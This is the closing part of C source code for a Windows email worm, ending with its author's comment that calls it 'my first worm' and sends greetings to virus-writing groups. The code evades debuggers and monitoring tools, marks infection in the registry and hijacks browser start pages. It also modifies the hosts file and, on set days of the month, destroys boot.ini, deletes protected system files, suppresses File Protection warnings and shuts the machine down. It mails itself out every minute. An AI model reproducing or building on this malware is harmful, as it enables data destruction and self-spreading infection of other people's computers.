	bFileMon = IsFileMonPresent();
	bRegMon = IsRegMonPresent();

	/* If any of the tools is running exit the application */
	if ((bSoftIce == 1) | (bOllyDbg == 1) | (bFileMon == 1) | (bRegMon == 1))
	{
		ExitProcess(0);
	}

	/* Test if PC is still infected */
	bInfected = IsPCInfected();

	/* If PC is not yet infected dot he following... */
	if(bInfected == -1)
	{
		HKEY hKey;
		char szBlackIce[] = "Aeon";
	
		/* Create the key showing that the PC is infected now */
		RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Aeon", &hKey);
		RegSetValueEx(hKey, "Aeon", 0, REG_SZ, szBlackIce, sizeof(szBlackIce));
	    RegCloseKey(hKey);

		/* For detailed descriptions look at the specific functions above */
		ChangeNameOrg();
		MakeHidden();
		CopyToPC();
		IEStartPageBSoD();
		FirefoxStartPageBSoD();
		OperaStartPageBSoD();
		ModifyHostFile();
		DisableMAPIWarning();
	}

	/* Get the system time */
	GetSystemTime(&stTime);
	/* Saving in a format only telling day (1, 2, 3...) */
	GetDateFormat(LOCALE_USER_DEFAULT, 0, &stTime, "dd", szDate, sizeof(szDate));

	/* If it is the 1st, 14th or 28th of a month go to start the destructive PAYLOAD */
	if((stTime.wDay == 1) | (stTime.wDay == 14) | (stTime.wDay == 28))
	{
		/* For detailed description look at the specific functions above */
		DestroyBootIni();
		ModifyHCR();
		BlackSystem();
		Messagebox();

		/* Delete all files in the FileNameList array by using the function DeleteFileName() */
		for (i = 0; FileNameList[i]; i++)
		{
			DeleteFileName(FileNameList[i]);
		}

		/* Wait for 5 seconds */
		Sleep(5000);

		/* Catch the upcoming Warning window after deleting the SFC protected files and close it (German) */
		hWnd = FindWindow(NULL, "Windows-Dateischutz");
		CloseWindow(hWnd);

		/* Catch the upcoming Warning window after deleting the SFC protected files and close it (English) */
		hWnd = FindWindow(NULL, "Windows File Protection");
		CloseWindow(hWnd);

		/* Drop a batch file and open it 10 times, keeping the windows open */
		DropAndExecuteBatch();

		/* Wait another 5 seconds */
		Sleep(5000);

		/* Shut down the system finally */
	    SystemShutdown();
	}

	/* Stay in background and try to spread via email every 60 seconds by creating a thread */
	do
	{
		/* Create a thread and trie to spread via email */
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MailMySelf, NULL, 0, NULL);

		if ((bSoftIce == 1) | (bOllyDbg == 1) | (bFileMon == 1) | (bRegMon == 1))
		{
			ExitProcess(0);
		}

		Sleep(60000);
	}while(1);


}/* The End */

/* 

Yeah that's it, my first worm and most complex (destructive ^^) creation until now... Learned new and cool stuff and 
had got ideas from several things. I like to thank <-< WarGame >-> most, for his patience with me and my sutpid questions and
giving me cool ideas while talking with him about code and plans for creations, thanks man ;)

It is also very practical to read virus description, I got many new ideas while looking over the things that others did
and hopefully even improved it =) The Firefox and Opera hacks were most fun while coding this, as it is quite new to change
anything of this two browsers, well my experience, Opera is even easier then Internet Explorer, but Firefox is quite complex,
using a JavaScript file to store preferences.

I also read an article about anti-cracking methods in Hakin9 (www.hakin9.org/en), it was an article from one of the first issues
in 2005 and this helped me doing the anti-debugging functions, I just picked out some of them and coded them, there were several
ones more explained, maybe in a next creation ;)

Greets to all the great guys of <-< EOF >->, it is great having such guys to code with, thanks for all and let us rock the scene!

Greets to Doomriderz Team, THE US Team in virus coding, you are doing a great job and are smart people to have interesting
conversations with: Go on!

Greets to Ready Rangers Liberation Front, with most of you I can talk even in my native language =), you are cool and always
friendly / helpful, keep it like this and good luck with everything!

And last, but not least some greets to everyone supporting us building up this magazine / project, especially Skvoznoy as being
a good friend and an supporter as well, thanks bro and thanks to all other people helping us in any way, to all the contributors,
keep on and the second issue will be rocking the same and better =) Also some greets to all VXers, Hackers and Crackers out there! 

*/
